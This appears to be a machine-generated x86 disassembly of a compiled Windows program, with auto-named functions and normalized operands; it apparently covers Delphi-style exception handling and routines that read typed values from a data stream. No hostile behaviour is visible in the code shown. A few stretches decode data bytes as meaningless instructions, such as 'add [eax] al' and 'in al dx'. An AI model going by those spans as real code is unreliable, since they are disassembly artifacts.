mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_4181b4
inc esi
dec ebx
jne r-xdata
sub_41c054
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_420d38
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405000
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051bc
add esp 0x4
mov edx ebx
mov eax edi
call sub_420d0c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405000
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_420d0c
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41c0cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405000
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41c134
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41c154
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40275c
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41c134
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41db84
call sub_40275c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403290
sub_41c1b4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c29a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41dd24
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41c26e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c29f
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c154
pop ecx
test al al
jne r-xdata
call sub_403ac0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a6c
sub_41c2c4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c33c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_40348c
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_417cd0
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c364
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c3df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41dd24
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_40348c
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c3e4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c154
pop ecx
test al al
jne r-xdata
call sub_403ac0
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a6c
sub_41c408
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c629
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41d6b4
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41d6b4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41c5f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41c5b7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c054
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c0cc
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41c1b4
pop ecx
push ebp
call sub_41c364
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41c2c4
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403af0
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c0cc
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41c0cc
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c630
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4051c8
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_40348c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41836c
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c018
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4181b4
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c018
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4181b4
sub_41c5bc
push ebp
call sub_41c134
pop ecx
test al al
je r-xdata
call sub_403a6c
call sub_403ac0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403290
sub_41c644
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c6b4
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41c69f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c6b4
mov eax [ ebp - 0x4 ]
call sub_41bc04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bd48
retn
sub_41c6b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41baec
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41cbbc
mov eax [ ebp - 0x4 ]
call sub_41ca58
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_40348c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41c776
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_40348c
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41baec
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41c408
mov eax [ ebp - 0x4 ]
call sub_41ca58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c77d
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41c784
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41d890
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ca0c
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41be54
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41c7c8
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41d890
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ca0c
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41be54
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41c80c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41d890
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ca0c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41be54
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41c85c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41d890
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ca0c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41be54
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41c8a0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41d890
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41b92c
mov al [ eax + lookup_table_41c8c7 ]
jmp [ eax * 4 + jump_table_41c8d5 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41be54
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_4040f8
mov eax esi
call j_sub_4044d4
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41be54
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41c9a0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41d890
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41be54
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41be54
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41be54
jmp r-xdata
jmp r-xdata
call sub_41b92c
sub_41ca0c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41be30
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41c9a0
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41d890
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41be54
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41ca60
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41be30
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41d890
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41c9a0
mov [ edi ] eax
sub_41ca9d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41cb91
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_404008
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4040a0
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cb98
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40426c
sub_41cbbc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41cd8c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403884#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41d6b4
xor edx edx
push ebp
push j_sub_403884
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_4042c8
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404528
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034b8
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414830
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034b8
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414830
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41cf40
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41be40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41be40
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_414924
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41cba0
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd93
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov edi ebx
jmp r-xdata
sub_41cd46
add [ eax ] eax
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add [ edx - 0x33 ] dl
inc ecx
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403a6c
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403ac0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd93
lea eax [ ebp - 0x8 ]
call sub_404008
retn
sub_41cd9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_417b78
mov ebx eax
test ebx ebx
je r-xdata
call sub_41b92c
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414998
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41cde4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b3c0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4181b4
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41ce24
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41ce73
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41dfa8
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4151b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ce7a
lea eax [ ebp - 0x10 ]
call sub_40ed6c
retn
sub_41ce80
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41cf32
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41be30
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c8a0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b3c0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4181b4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d890
lea eax [ ebp - 0x4 ]
call sub_405874
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_415354
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cf39
lea eax [ ebp - 0x8 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_405874
retn
sub_41cf40
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d23b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d242
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x24 ]
call sub_4046e8
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40402c
retn
jmp [ eax * 4 + jump_table_41cfd0 ]
mov eax [ rw-data ]
call sub_41b914
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414924
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41be30
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bef0
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414998
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41c8a0
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_4147cc
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414998
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c784
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414f6c
jmp r-xdata
lea edx [ ebp - 0x20 ]
